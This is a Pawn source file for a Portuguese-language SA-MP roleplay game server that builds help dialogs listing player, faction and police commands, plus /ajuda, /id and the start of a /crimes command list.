#include <YSI_Coding\y_hooks>

//------------------------- Definitions and constants -------------------------

//------------------------- Data (This section is for module-internal data. Make sure to make the accessor variable 'static') -------------------------

//------------------------- External API (Functions accessible from other modules. Use 'stock' and PascalCase.) -------------------------

//------------------------- Internal API (Functions to be used only inside of this module. Use 'static (stock)' and camelCase) -------------------------
static ShowHelpDialog(playerid)
{
    new helpList[559];
    strcat(helpList, "{1e90ff}Ajuda » {ffffff}FAQ (Dúvidas Frequentes)\n{1e90ff}Ajuda » {ffffff}Inventário\n{1e90ff}Ajuda » {ffffff}Veículos\n{1e90ff}Ajuda » {ffffff}Veículo Próprio\n{1e90ff}Ajuda » {ffffff}Comandos do Servidor\n{1e90ff}Ajuda » {ffffff}Comandos do SA-MP\n{1e90ff}Ajuda » {ffffff}Casa\n{1e90ff}Ajuda » {ffffff}Empresa\n{1e90ff}Ajuda » {ffffff}Líder\n{1e90ff}Ajuda » {ffffff}Sub-Líder\n{1e90ff}Ajuda » {ffffff}Emprego\n{1e90ff}Ajuda » {ffffff}Organização\n{1e90ff}Ajuda » {ffffff}Acessórios\n{1e90ff}Ajuda » {ffffff}Caixa Surpresa\n{1e90ff}Ajuda » {ffffff}Animações");
    return ShowPlayerDialog(playerid, DIALOG_HELP_LIST, DIALOG_STYLE_LIST, "{FFFFFF}» {1e90ff}Ajuda do Servidor", helpList, "Escolher", "Cancelar");
}

//------------------------- Implementation (This section contains the concrete implementation for this module inside of the callbacks) -------------------------
hook OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
    switch (dialogid)
    {
        case DIALOG_HELP_LIST:
		{
		    if (!response)
			{
				return SendClientMessage(playerid, COLOR_INVALID, "Você fechou a ajuda.");
			}
			if (response)
			{
			    switch (listitem)
		        {
		            case 0:
					{
	     				return ShowHelpDialog(playerid);
					}
		            case 1:
					{
					    new helpMessage[392];
					    strcat(helpMessage, "{0080ff}Opções:\n");
						strcat(helpMessage, "{FFFFFF}USAR: {848484}Usa o item selecionado.\n");
						strcat(helpMessage, "{FFFFFF}VENDER: {848484}Vende o item selecionado para outro jogador.\n");
	                    strcat(helpMessage, "{FFFFFF}DESTRUIR: {848484}Destrói permanentemente o item selecionado.\n");
						strcat(helpMessage, "{FFFFFF}ANUNCIAR: {848484}Anuncia a venda do item selecionado.\n\n");
						strcat(helpMessage, "{ff6347}OBS: {FFFFFF}Para abrir seu inventário digite: {0080ff}(/inventario) {FFFFFF}ou pressione {0080ff}(Y).{FFFFFF}\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Inventário", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 2:
					{
					    new helpMessage[327];
					    strcat(helpMessage, "{0080ff}Comandos:\n");
						strcat(helpMessage, "{FFFFFF}/motor: {848484}Liga/Desliga o motor do veículo.\n");
						strcat(helpMessage, "{FFFFFF}/farol: {848484}Liga/Desliga o farol do veículo.\n");
	                    strcat(helpMessage, "{FFFFFF}/mala: {848484}Abre/Fecha o porta-malas do veículo.\n");
						strcat(helpMessage, "{FFFFFF}/camera: {848484}Ativa/Desativa a câmera em primeira pessoa.\n");
						strcat(helpMessage, "{FFFFFF}/flash: {848484}Ativa/Desativa o flash do veículo.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Veículos", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 3:
					{
						return ShowPlayerDialog(playerid, DIALOG_ONLY_READ, DIALOG_STYLE_MSGBOX, "{FFFFFF}Comandos de Veículo Próprio", "{FFFFFF}Comandos de Veículos Próprios:\n\n-> {2e9afe}/meusveiculos - Gerencia todos os seus veículos próprios\n\n{ff6347}Informações:\n\n{0b610b}Sair do jogo: {585858}Toda vez que você sair do jogo, seu veículo sairá junto, e será carregado novamente\nonde estacionou, caso tenha comprado e não estacionado, ele ficará na última posição onde ficou pela última vez.\nAo você spawnar no menu do veículo, a mesma coisa vale para quando o veículo explodir\nserá necessário spawnar ele novamente.\n\n{0b610b}Limite de Veículo: {585858}Jogadores Free poderão ter no máximo 1 veículo próprio, jogadores Vip poderão\npossuir até 5 veículos próprio (dependendo do tipo de Vip). OBS: Caso tenha comprado 5 veículos sendo Vip e\nos dias de VIP acabarem, não precisará se preocupar pois ele ficará para sempre.\n\n{0b610b}Revenda: {585858}Ao revender seu veículo na Revendedora, receberá o valor 3x menor do preço original.", "Fechar", "");
					}
					case 4:
					{
						new helpMessage[1770];
						strcat(helpMessage, "{ff6347}OBS: {FFFFFF}Nem todos os comandos estão listados, portanto, caso tenha dúvidas utilize o chat {0080ff}/n{FFFFFF}.\n\n");
					    strcat(helpMessage, "{FFFFFF}• {0080ff}Lista de comandos e suas respectivas funções:\n");
						strcat(helpMessage, "{FFFFFF}/ajuda: {848484}Obtém informações sobre os sistemas do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/rg: {848484}Visualiza a sua identidade.\n");
	                    strcat(helpMessage, "{FFFFFF}/configuracoes: {848484}Abre as personalizações de modo de jogo.\n");
						strcat(helpMessage, "{FFFFFF}/regras: {848484}Mostra as regras do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/sites: {848484}Mostra as mídias sociais do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/relatorio(/relato): {848484}Solicita um atendimento com um administrador.\n");
						strcat(helpMessage, "{FFFFFF}/anunciar(/an): {848484}Anuncia algo para todos os jogadores.\n");
						strcat(helpMessage, "{FFFFFF}/eu: {848484}Simula uma ação no chat.\n");
						strcat(helpMessage, "{FFFFFF}/pagar: {848484}Dar dinheiro de sua mão para um jogador.\n");
						strcat(helpMessage, "{FFFFFF}/gps: {848484}Localizar um local do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/livrar: {848484}Joga fora itens ilegais.\n");
						strcat(helpMessage, "{FFFFFF}/ejetar: {848484}Expulsa um jogador do veículo.\n");
						strcat(helpMessage, "{FFFFFF}/solicitar: {848484}Solicita por um serviço.\n");
						strcat(helpMessage, "{FFFFFF}/titulos: {848484}Mostra os títulos disponíveis para uso.\n");
						strcat(helpMessage, "{FFFFFF}/mostrarrg: {848484}Mostra sua identidade para um jogador.\n");
						strcat(helpMessage, "{FFFFFF}/procurar: {848484}Procura por um jogador no mapa.\n");
						strcat(helpMessage, "{FFFFFF}/localizar: {848484}Localiza locais importantes do jogador.\n");
						strcat(helpMessage, "{FFFFFF}/minhaslicencas: {848484}Mostra suas habilitações.\n");
						strcat(helpMessage, "{FFFFFF}/habilidades: {848484}Mostra suas habilidades profissionais.\n");
						strcat(helpMessage, "{FFFFFF}/animes: {848484}Mostra os animes do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/inventario: {848484}Abre o inventário do jogador.\n");
						strcat(helpMessage, "{FFFFFF}/dormir: {848484}Ativa o modo dormir.\n");
						strcat(helpMessage, "{FFFFFF}/rank: {848484}Vê o rank de jogadores do servidor.\n");
						strcat(helpMessage, "{FFFFFF}/meusveiculos: {848484}Acessa o menu de veículos próprios do jogador.\n");
						strcat(helpMessage, "{FFFFFF}/acessorios: {848484}Acessa o menu de acessórios equipados do jogador.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_CMDS1, DIALOG_STYLE_MSGBOX, "{FFFFFF}Listagem de Comandos: {0080ff}1", helpMessage, "Próximo", "Voltar");
						return 1;
					}
					case 5:
					{
						new helpMessage[1999];
						strcat(helpMessage, "{0080ff}/quit (ou /q): {FFFFFF}Fecha o GTA.\n\n");
						strcat(helpMessage, "{0080ff}/fpslimit: {FFFFFF}Este comando define o limite de FPS (quadros por segundo) para o seu jogo.\nQuanto maior o limite, mais suave é o seu jogo. Não tem efeito se o limitador de quadro\nestiver desativado nas opções gráficas. O limite pode ser definido entre 20 e 90.\n\n");
						strcat(helpMessage, "{0080ff}/pagesize: {FFFFFF}É usado para escolher a quantidade de linhas do chat a serem exibidas.\nPode ser de 10 a 20 linhas. O tamanho da página é 10 por padrão.\n\n");
						strcat(helpMessage, "{0080ff}/headmove: {FFFFFF}Este comando irá ativar/desativar os movimentos da cabeça dos personagens.\n\n");
						strcat(helpMessage, "{0080ff}/timestamp: {FFFFFF}Este comando mostrará/ocultará a hora ao lado de todas as mensagens\ndo chat (A hora exibida é a do seu computador, não a do servidor).\n\n");
						strcat(helpMessage, "{0080ff}/dl: {FFFFFF}Este comando ativa/desativa um rótulo em todos os veículos (apenas para você)\nexibindo a identificação do ID do veículo, modelo, lataria e etc.\n\n");
						strcat(helpMessage, "{0080ff}/audiomsg: {FFFFFF}Ativa/Desativa a mensagem que é exibida no chat quando uma URL é transmitida\npara você. Exemplo: Quando um jogador colocar som próximo a você, não vai aparecder o\nLINK da música, apenas irá reproduzir o áudio da URL.\n\n");
						strcat(helpMessage, "{0080ff}/fontsize: {FFFFFF}Altera o tamanho da fonte da interface do usuário (bate-papo, diálogos[menu] e etc).\nO tamanho de letra válido é de -3 a 5.\n\n");
						strcat(helpMessage, "{0080ff}/meustatus: {FFFFFF}Comando para exibir um menu com informações de sua CONEXÃO.\n\n\n");
						strcat(helpMessage, "{848484}Teclas de Atalho:.\n");
						strcat(helpMessage, "{FFFFFF}[TAB] - {848484}Exibe informações dos jogadores conectados, como: level, ping e etc.\n");
						strcat(helpMessage, "{FFFFFF}[F5] - {848484}Exibe as estatísticas de largura de banda (Conexão).\n");
						strcat(helpMessage, "{FFFFFF}[F7] - {848484}Altera o CHAT do Servidor (Oculta ou diminui o brilho).\n");
						strcat(helpMessage, "{FFFFFF}[F5] - {848484}Tira um a print(Screenshot) da tela. (Pasta: GTA San Andreas User Files).\n");
						strcat(helpMessage, "{FFFFFF}[F9] - {848484}Oculta/Mostra o chatkill.\n");
						strcat(helpMessage, "{FFFFFF}[T] - {848484}Abre o chat do servidor para inserior comandos ou mensagens.\n");
						strcat(helpMessage, "{FFFFFF}[G] - {848484}Entra em um veículo como passageiro.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Comandos do: {0080ff}SA-MP", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 6:
					{
						/*if (playerInfo[playerid][pHouseKey] == UNDEFINED_HOUSE)
						{
							return SendClientMessage(playerid, COLOR_INVALID, "Você não possui uma casa.");
						}*/
						new helpMessage[246];
					    strcat(helpMessage, "{0080ff}Comandos:\n");
						strcat(helpMessage, "{FFFFFF}/chave: {848484}Tranca/Destranca a casa.\n");
						strcat(helpMessage, "{FFFFFF}/abandonarcasa: {848484}Vende a casa para o governo.\n");
	                    strcat(helpMessage, "{FFFFFF}/vendercasa: {848484}Vende a casa para um jogador.\n");
						strcat(helpMessage, "{FFFFFF}/menucasa: {848484}Acessa as opções da casa.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Casa", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 7:
					{
						/*if (playerInfo[playerid][pCompanyKey] == UNDEFINED_BIZZ)
						{
							return SendClientMessage(playerid, COLOR_INVALID, "Você não possui uma empresa.");
						}*/
						new helpMessage[268];
					    strcat(helpMessage, "{0080ff}Comandos:\n");
						strcat(helpMessage, "{FFFFFF}/chaveb: {848484}Tranca/Destranca a empresa.\n");
						strcat(helpMessage, "{FFFFFF}/abandonarempresa: {848484}Vende a empresa para o governo.\n");
	                    strcat(helpMessage, "{FFFFFF}/venderempresa: {848484}Vende a empresa para um jogador.\n");
						strcat(helpMessage, "{FFFFFF}/menuempresa: {848484}Acessa as opções da empresa.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Empresa", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 8:
					{
					    /*if (playerInfo[playerid][pOrgRole] != 6)
						{
						    return SendClientMessage(playerid, COLOR_INVALID, "Você não é um líder.");
						}*/
						//
						new helpMessage[664];
					    strcat(helpMessage, "{0080ff}Comandos destinados aos líderes:\n");
						strcat(helpMessage, "{FFFFFF}/convidar: {848484}Convida um jogador para a organização.\n");
						strcat(helpMessage, "{FFFFFF}/promover: {848484}Promove um jogador a um cargo superior.\n");
	                    strcat(helpMessage, "{FFFFFF}/demitir: {848484}Demiti um jogador da organização.\n");
						strcat(helpMessage, "{FFFFFF}/addblacklist: {848484}Adiciona um jogador à blacklist.\n");
						strcat(helpMessage, "{FFFFFF}/rblacklist: {848484}Remove um jogador da blacklist.\n");
						strcat(helpMessage, "{FFFFFF}/lchat: {848484}Chat dos líderes e sub-líderes do servidor.\n");
						/*if (IsACop(playerid))
						{
							strcat(helpMessage, "{FFFFFF}/rmbq: {848484}Remove todos os bloqueios.\n");
							strcat(helpMessage, "{FFFFFF}/rmbr: {848484}Remove todas as barreiras.\n");
							strcat(helpMessage, "{FFFFFF}/rmpr: {848484}Remove todos os tapetes de pregos.\n");
						}
						if (IsAGoverno(playerid))
						{
							strcat(helpMessage, "{FFFFFF}/mudarimposto: {848484}Altera o valor do imposto de renda.\n");
						}*/
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Líderes", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 9:
					{
					    /*if (playerInfo[playerid][pOrgRole] != 5)
						{
						    return SendClientMessage(playerid, COLOR_INVALID, "Você não é um sub-líder.");
						}*/
						//
					    new helpMessage[664];
					    strcat(helpMessage, "{0080ff}Comandos destinados aos líderes:\n");
						strcat(helpMessage, "{FFFFFF}/convidar: {848484}Convida um jogador para a organização.\n");
						strcat(helpMessage, "{FFFFFF}/promover: {848484}Promove um jogador a um cargo superior.\n");
	                    strcat(helpMessage, "{FFFFFF}/demitir: {848484}Demiti um jogador da organização.\n");
						strcat(helpMessage, "{FFFFFF}/addblacklist: {848484}Adiciona um jogador à blacklist.\n");
						strcat(helpMessage, "{FFFFFF}/rblacklist: {848484}Remove um jogador da blacklist.\n");
						strcat(helpMessage, "{FFFFFF}/lchat: {848484}Chat dos líderes e sub-líderes do servidor.\n");
						/*if (IsACop(playerid))
						{
							strcat(helpMessage, "{FFFFFF}/rmbq: {848484}Remove todos os bloqueios.\n");
							strcat(helpMessage, "{FFFFFF}/rmbr: {848484}Remove todas as barreiras.\n");
							strcat(helpMessage, "{FFFFFF}/rmpr: {848484}Remove todos os tapetes de pregos.\n");
						}*/
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Líderes", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 10:
					{
                        return 1;
					    // return ReCommand:ajudaemprego(playerid);
					}
					case 11:
					{
					    /*if (playerInfo[playerid][pOrg] == UNDEFINED_ORG)
						{
						    return SendClientMessage(playerid, COLOR_INVALID, "Você não faz parte de uma organização.");
						}
						//
					    new helpMessage[3000], titleDialog[87];
						if (IsACop(playerid) && playerInfo[playerid][pOrg] != ID_GOVERNO && playerInfo[playerid][pOrg] != ID_DETRAN)
						{
							strcat(helpMessage, "{0080ff}Comandos destinados aos policiais:\n");
							strcat(helpMessage, "{FFFFFF}/prender: {848484}Prende um criminoso.\n");
							strcat(helpMessage, "{FFFFFF}/algemar: {848484}Algema um suspeito.\n");
							strcat(helpMessage, "{FFFFFF}/desalgemar: {848484}Desalgema um suspeito.\n");
							strcat(helpMessage, "{FFFFFF}/m: {848484}Usa o Megafone Policial.\n");
							strcat(helpMessage, "{FFFFFF}/reforco: {848484}Pede reforço contra um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/sireneon: {848484}Coloca sirene no veículo.\n");
							strcat(helpMessage, "{FFFFFF}/procurados: {848484}Mostra os criminosos online.\n");
							strcat(helpMessage, "{FFFFFF}/presos: {848484}Mostra os presos online.\n");
							strcat(helpMessage, "{FFFFFF}/multar: {848484}Multa um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/r: {848484}Chat da Organização.\n");
							strcat(helpMessage, "{FFFFFF}/d: {848484}Chat do Governo.\n");
							strcat(helpMessage, "{FFFFFF}/infocar: {848484}Verifica as informações de um veículo.\n");
							strcat(helpMessage, "{FFFFFF}/multarplaca: {848484}Multa a placa de um veículo.\n");
							strcat(helpMessage, "{FFFFFF}/su: {848484}Incrimina um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/bq: {848484}Planta um bloqueio.\n");
							strcat(helpMessage, "{FFFFFF}/barreira: {848484}Planta uma barreira.\n");
							strcat(helpMessage, "{FFFFFF}/pregos: {848484}Planta um tapete de pregos.\n");
							strcat(helpMessage, "{FFFFFF}/gov: {848484}Anuncia algo para todos.\n");
							strcat(helpMessage, "{FFFFFF}/jaula: {848484}Libera o jogador da jaula (Finaliza o sequestro).\n");
							strcat(helpMessage, "{FFFFFF}/desamarrar: {848484}Desamarra o jogador (Finaliza o sequestro).\n");
							strcat(helpMessage, "{FFFFFF}/revistar: {848484}Revista um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/vdp: {848484}Dá ao criminoso uma voz de prisão.\n");
							strcat(helpMessage, "{FFFFFF}/vdr: {848484}Dá ao jogador uma voz de revista.\n");
						}
						else if (IsAGoverno(playerid))
						{
							strcat(helpMessage, "{0080ff}Comandos destinados ao governo:\n");
							strcat(helpMessage, "{FFFFFF}/prender: {848484}Prende um criminoso.\n");
							strcat(helpMessage, "{FFFFFF}/algemar: {848484}Algema um suspeito.\n");
							strcat(helpMessage, "{FFFFFF}/desalgemar: {848484}Desalgema um suspeito.\n");
							strcat(helpMessage, "{FFFFFF}/m: {848484}Usa o Megafone Policial.\n");
							strcat(helpMessage, "{FFFFFF}/reforco: {848484}Pede reforço contra um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/sireneon: {848484}Coloca sirene no veículo.\n");
							strcat(helpMessage, "{FFFFFF}/procurados: {848484}Mostra os criminosos online.\n");
							strcat(helpMessage, "{FFFFFF}/presos: {848484}Mostra os presos online.\n");
							strcat(helpMessage, "{FFFFFF}/multar: {848484}Multa um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/r: {848484}Chat da Organização.\n");
							strcat(helpMessage, "{FFFFFF}/d: {848484}Chat do Governo.\n");
							strcat(helpMessage, "{FFFFFF}/infocar: {848484}Verifica as informações de um veículo.\n");
							strcat(helpMessage, "{FFFFFF}/multarplaca: {848484}Multa a placa de um veículo.\n");
							strcat(helpMessage, "{FFFFFF}/su: {848484}Incrimina um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/bq: {848484}Planta um bloqueio.\n");
							strcat(helpMessage, "{FFFFFF}/barreira: {848484}Planta uma barreira.\n");
							strcat(helpMessage, "{FFFFFF}/pregos: {848484}Planta um tapete de pregos.\n");
							strcat(helpMessage, "{FFFFFF}/gov: {848484}Anuncia algo para todos.\n");
							strcat(helpMessage, "{FFFFFF}/revistar: {848484}Revista um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/vdp: {848484}Dá ao criminoso uma voz de prisão.\n");
							strcat(helpMessage, "{FFFFFF}/vdr: {848484}Dá ao jogador uma voz de revista.\n");
						}
						else if (playerInfo[playerid][pOrg] == ID_DETRAN)
						{
							strcat(helpMessage, "{ff6347}Importante: {FFFFFF}O DETRAN possui os comandos de Policiais, no entanto ele não exerce a função\nSó será permitido aplicar o (/su) em blitz caso encontre entorpecentes, nteste caso estará autorizado a algemar\no suspeito e levar até a penitenciária e prendê-lo. Em hipótese algumao DETRAN poderá ir atrás de procurados,\nse isso acontecer, estará sujeito a levar punição por um admin ou receber denúncia no fórum.\n\n");
							strcat(helpMessage, "{848484}Observação:\n{B4B5B7}O DETRAN está autorizado a apreender veículos que estejam espalhados pela cidade ou que constem com multas.\nÉ uma revista, caso constate que o veículo do indivídio tenha multa de até 1 hora de recência deverá liberá-lo.\nPara apreender determinado veículo, basta utilizar o comando (/guinchar) e levá-lo até o pátio que está\nlocalizado em sua HQ. Após cjegar na HQ do DETRAN, entre no veículo guinchado e leve até o interior do pátio.\nApós isso, fixe o veículo utilizando (/fixar); O DETRAn consegue entrar em veículos de ORGANIZAÇÃO caso esteja\npróximo a HQ. Caso guinche algum veículo próprio e não consegia entrar no veículo por estar trancado, use o\ncomando (/abrirveiculo).\n\n");
							strcat(helpMessage, "{0080ff}Veículo Próprio: {B4B5B7}Veículo próprio poderá ser guinchado também, porém, ele irá sumir caso o proprietário dele\ndesconecte do servidor, porém, quando logar novamente, o veículo será sertado automaticamente no Pátio novamente\naté o proprietário soltá-lo!\n\n");
							strcat(helpMessage, "{ccccff}Mecânico: {FFFFFF}O DETRAN poderá trabalhar de Bico como Mecânico caso possua Cargo 2+, para isso, basta ir até\na Oficina do DETRAN e digitar: (/batercartao).\n\n");
							strcat(helpMessage, "{f60000}Comandos:\n");
							strcat(helpMessage, "{848484}/fixar					/crimes\n");
							strcat(helpMessage, "{848484}/guinchar				/dl\n");
							strcat(helpMessage, "{848484}/desfixar				/revistar\n");
							strcat(helpMessage, "{848484}/prender				/abrirveiculo\n");
							strcat(helpMessage, "{848484}/r					/d\n");
							strcat(helpMessage, "{848484}/m					/multar\n");
							strcat(helpMessage, "{848484}/multarplaca  				/gov\n");
							strcat(helpMessage, "{848484}/reforco				/su\n");
							strcat(helpMessage, "{848484}/bq					/rbq\n");
							strcat(helpMessage, "{848484}/br					/rbr\n");
							strcat(helpMessage, "{848484}/pregos					/rpr\n");
							strcat(helpMessage, "{848484}/algemar				/desalgemar\n");
							strcat(helpMessage, "{848484}/procurados				/presos\n");
							strcat(helpMessage, "{848484}/vdp					/vdr\n");
							strcat(helpMessage, "{848484}/infocar					/sireneon\n\n");
							strcat(helpMessage, "{ccccff}Comandos Mecânicos:\n");
							strcat(helpMessage, "{848484}/reparar				/blindar\n");
							strcat(helpMessage, "{848484}/tunar					/abastecer\n");

						}
						else if (IsAGangster(playerid) || IsAMafia(playerid) || IsATerror(playerid) || IsAMercenary(playerid))
						{
							strcat(helpMessage, "{0080ff}Comandos destinados aos criminosos:\n");
							strcat(helpMessage, "{FFFFFF}/ga: {848484}Chat da Organização.\n");
							strcat(helpMessage, "{FFFFFF}/assaltar: {848484}Assalta um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/sequestrar: {848484}Sequestra um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/vendermaconha: {848484}Vende maconha para um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/vendercocaina: {848484}Vende cocaína para um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/vendercrack: {848484}Vende crack para um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/roubar: {848484}Rouba um cofre.\n");
							strcat(helpMessage, "{FFFFFF}/ang: {848484}Anuncia algo para todos.\n");
							strcat(helpMessage, "{FFFFFF}/jaula: {848484}Coloca o jogador na jaula do cativeiro.\n");
							strcat(helpMessage, "{FFFFFF}/desamarrar: {848484}Liberta o refém do sequestro.\n");
							strcat(helpMessage, "{FFFFFF}/incendiar: {848484}Incendeia um local.\n");
							if (IsAMafia(playerid))
							{
								strcat(helpMessage, "{FFFFFF}/venderkit: {848484}Vende de Kit de Armas.\n\n");
								strcat(helpMessage, "{ff6347}OBS: {FFFFFF}É possível vender dinamites e outros itens no território.\n");
							}
							if (IsATerror(playerid))
							{
								strcat(helpMessage, "{FFFFFF}/trvarma: {848484}Vende Armas Espeiciais.\n");
								strcat(helpMessage, "{FFFFFF}/homembomba: {848484}Explodir-se.\n");
								strcat(helpMessage, "{FFFFFF}/plantarbomba: {848484}Planta uma bomba.\n");
								strcat(helpMessage, "{FFFFFF}/dbomba: {848484}Explode uma bomba plantada.\n");
							}
							if (IsAMercenary(playerid))
							{
								strcat(helpMessage, "{FFFFFF}/mcvarma: {848484}Vende Armas Espeicais.\n");
							}
						}
						else if (playerInfo[playerid][pOrg] == ID_DETRAN)
						{
							strcat(helpMessage, "{0080ff}Comandos destinados ao detran:\n");
							strcat(helpMessage, "{FFFFFF}/ga: {848484}Chat da Organização.\n");
							strcat(helpMessage, "{FFFFFF}/reparar: {848484}Repara o veículo de um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/blindar: {848484}Blinda o veículo de um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/abastecer: {848484}Abastece o veículo de um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/tunar: {848484}Tuna o veículo de um jogadorr.\n");
							strcat(helpMessage, "{FFFFFF}/fixar: {848484}Fixa/Refixa um veículo na HQ.\n");
							strcat(helpMessage, "{FFFFFF}/desfixar: {848484}Desfixa um veículo fixado na HQ.\n");
							strcat(helpMessage, "{FFFFFF}/darrespawn: {848484}Respawna um veículo próximo.\n");
							strcat(helpMessage, "{FFFFFF}/guinchar: {848484}Guincha um veículo (Exceto motos).\n");
							strcat(helpMessage, "{FFFFFF}/guincharmoto: {848484}Guinhca uma moto (Apenas no BoxVille).\n");
							strcat(helpMessage, "{FFFFFF}/soltarmotos: {848484}Solta a moto guinchada (Apenas no BoxVille).\n");
						}
						else if (playerInfo[playerid][pOrg] == ID_REPORTERES)
						{
							strcat(helpMessage, "{0080ff}Comandos destinados aos repórteres:\n");
							strcat(helpMessage, "{FFFFFF}/ga: {848484}Chat da Organização.\n");
							strcat(helpMessage, "{FFFFFF}/noticia(/no): {848484}Divulga uma notícia.\n");
							strcat(helpMessage, "{FFFFFF}/aovivo: {848484}Inicia uma entrevista.\n");
						}
						format(titleDialog, sizeof(titleDialog), "{FFFFFF}Comandos do(a): {%06x}%s", orgColors[playerInfo[playerid][pOrg]] >>> 8, OrgInfo[playerInfo[playerid][pOrg]][oName]);
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, titleDialog, helpMessage, "Entendi", "");
						return 1;*/
					}
					case 12:
					{
						new helpMessage[164];
					    strcat(helpMessage, "{0080ff}Comandos:\n");
						strcat(helpMessage, "{FFFFFF}/acessorios: {848484}Edita os acessórios equipados.\n\n");
						strcat(helpMessage, "{ff6347}OBS: {FFFFFF}Para equipar um acessório, basta usá-lo no seu inventário.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Acessórios", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 13:
					{
                        return 1;
						// return ReCommand:infocaixa(playerid);
					}
					case 14:
					{
                        return 1;
						// return ReCommand:animes(playerid);
					}
				}
			}
		}
    }
    return 1;
}

YCMD:ajuda(playerid, params[], help)
{
	return ShowHelpDialog(playerid);
}

YCMD:id(playerid, params[], help) 
{
	new id;
	if (sscanf(params, "u", id))
	{
		return SendClientMessage(playerid, COLOR_INVALID, "USE: /id [ID/Nick]");
	}
    if (!IsValidPlayer(id, PlayerData_GetIsLogged(id)))
	{
		return SendClientMessage(playerid, COLOR_INVALID, "Esse não é um player ativo.");
	}
	if (PlayerData_GetAdmin(id) >= HELPER_OWNER)
	{
        return 0;
	}

	new string[55];
	format(string, sizeof(string), "ID: (%d) %s - Level[%d].", id, Player_GetName(id), PlayerData_GetLevel(id));
    SendClientMessage(playerid, COLOR_GRAD1, string);
    return 1;
}

YCMD:crimes(playerid, params[], help) 
{
    static crimesDialog[2425 + 1];
    strcat(crimesDialog, "{848484}- /su {FFFFFF}TH: {848484}Tentativa de Homicídio.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Invasão: {848484}Invasão de local restrito.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}DOP: {848484}Desobediênciaa uma ordem policial.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Desacato: {848484}Desrespeito à um oficial da justiça.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Dinamite: {848484}Quando um suspeito estiver portando dinamite.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Vandalismo: {848484}Quando um jogador destrói um bem público.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Racha: {848484}Quando um jogador está competindo numa racha.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Fuga: {848484}Quando um procurado entra em fuga com a polícia.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Ameaça: {848484}Quando um jogador ameaça claramente outro.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Sequestro: {848484}Quando há um sequestro por parte de outro jogador.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Atentado: {848484}Quando um jogador está fazendo parte de um atentado.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Materiais: {848484}Quando um jogador é pego em uma revista portando materiais.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Cumplice: {848484}Quando um jogador está servido de suporte à um procurado.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Tráfico: {848484}Quando um meliante está vendendo armas, explosivos ou drogas.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Agressão: {848484}Quando um jogador começa a bater em alguém sem motivo algum.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Homicídio: {848484}Quando um jogador comete um homicídio e não leva /su automático.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Trote: {848484}Quando um jogador usa o /solicitar -> policial sem motivos ou por brincadeira.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Roubo: {848484}Quan do alguém está perto do cofre, ou rouba veículo de um outro jogador.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Ajuste: {848484}Ajusta pena de um preso (APENAS LÍDER OU SUBLÍDER PODE USÁ-LO).\n");
